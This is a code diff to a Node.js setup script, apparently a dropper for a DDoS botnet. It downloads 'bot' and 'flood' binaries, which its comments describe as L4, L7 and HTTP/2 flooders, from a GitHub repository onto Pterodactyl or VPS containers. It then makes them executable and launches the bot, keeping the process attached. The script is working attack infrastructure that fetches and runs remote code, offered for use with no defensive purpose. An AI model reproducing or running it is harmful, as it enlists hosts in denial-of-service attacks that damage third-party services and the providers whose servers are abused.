@@ -1,22 +1,21 @@
 /**
  * Bot Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
- * Downloads bot binary, flood binary, and agent.txt from GitHub repository
- * Creates method symlinks, sets executable permissions, and keeps process attached to container
+ * Downloads bot + flood (all-in-one: L4/L7/H2) binaries and agent.txt
+ * from GitHub repository, sets executable permissions, and launches bot.
  */
 
 const https = require('https');
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
+const http  = require('http');
+const fs    = require('fs');
+const path  = require('path');
 const { spawn } = require('child_process');
 
 const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';
 
 const FILES_TO_DOWNLOAD = [
-    { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
-    { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
-    { url: `${REPO_BASE}/bots/tls/tls`, filename: 'tls', executable: true },
-    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
+    { url: `${REPO_BASE}/bots/bot`,       filename: 'bot',       executable: true  },
+    { url: `${REPO_BASE}/bots/flood`,     filename: 'flood',     executable: true  },
+    { url: `${REPO_BASE}/agent.txt`,      filename: 'agent.txt', executable: false },
 ];
 
 function download(url, destPath) {
@@ -29,24 +28,14 @@ function download(url, destPath) {
             }
 
             if (res.statusCode !== 200) {
-                return reject(new Error(`Failed to download ${url}: HTTP status ${res.statusCode}`));
+                return reject(new Error(`HTTP ${res.statusCode} — ${url}`));
             }
 
             const fileStream = fs.createWriteStream(destPath);
             res.pipe(fileStream);
-
-            fileStream.on('finish', () => {
-                fileStream.close(resolve);
-            });
-
-            fileStream.on('error', (err) => {
-                fs.unlink(destPath, () => {});
-                reject(err);
-            });
-        }).on('error', (err) => {
-            fs.unlink(destPath, () => {});
-            reject(err);
-        });
+            fileStream.on('finish', () => fileStream.close(resolve));
+            fileStream.on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
+        }).on('error', (err) => { fs.unlink(destPath, () => {}); reject(err); });
     });
 }
 
@@ -58,52 +47,40 @@ async function setup() {
         const dest = path.join(targetDir, item.filename);
         try {
             process.stdout.write(`[*] Downloading ${item.filename}... `);
-            const nocacheUrl = `${item.url}?t=${Date.now()}`;
-            await download(nocacheUrl, dest);
+            await download(`${item.url}?t=${Date.now()}`, dest);
             console.log('OK');
-
             if (item.executable) {
                 fs.chmodSync(dest, 0o755);
-                console.log(`[+] Set chmod +x for ${item.filename}`);
+                console.log(`[+] chmod +x ${item.filename}`);
             }
         } catch (err) {
             console.log('FAILED');
-            console.error(`[!] Error with ${item.filename}: ${err.message}`);
+            console.error(`[!] ${item.filename}: ${err.message}`);
         }
     }
 
-    const botBinPath = path.join(targetDir, 'bot');
-    if (fs.existsSync(botBinPath)) {
-        console.log('[+] Launching Bot process (attached to container)...');
-        const child = spawn(botBinPath, [], {
-            cwd: targetDir,
-            stdio: ['inherit', 'pipe', 'pipe']
-        });
-
-        child.stdout.on('data', (data) => {
-            process.stdout.write(data);
-        });
-
-        child.stderr.on('data', (data) => {
-            process.stderr.write(data);
-        });
-
-        child.on('error', (err) => {
-            console.error(`[!] Failed to start bot process: ${err.message}`);
-            process.exit(1);
-        });
-
-        child.on('exit', (code, signal) => {
-            console.log(`[!] Bot process exited with code ${code} (signal: ${signal})`);
-            process.exit(code || 0);
-        });
-
-        process.on('SIGINT', () => child.kill('SIGINT'));
-        process.on('SIGTERM', () => child.kill('SIGTERM'));
-    } else {
-        console.error('[-] Bot binary not found, execution skipped.');
+    const botBin = path.join(targetDir, 'bot');
+    if (!fs.existsSync(botBin)) {
+        console.error('[-] Bot binary not found, aborting.');
         process.exit(1);
     }
+
+    console.log('[+] Launching bot...');
+    const child = spawn(botBin, [], {
+        cwd:   targetDir,
+        stdio: ['inherit', 'pipe', 'pipe'],
+    });
+
+    child.stdout.on('data', (d) => process.stdout.write(d));
+    child.stderr.on('data', (d) => process.stderr.write(d));
+    child.on('error', (err) => { console.error(`[!] ${err.message}`); process.exit(1); });
+    child.on('exit',  (code, sig) => {
+        console.log(`[!] Bot exited: code=${code} signal=${sig}`);
+        process.exit(code || 0);
+    });
+
+    process.on('SIGINT',  () => child.kill('SIGINT'));
+    process.on('SIGTERM', () => child.kill('SIGTERM'));
 }
 
 setup().catch((err) => {
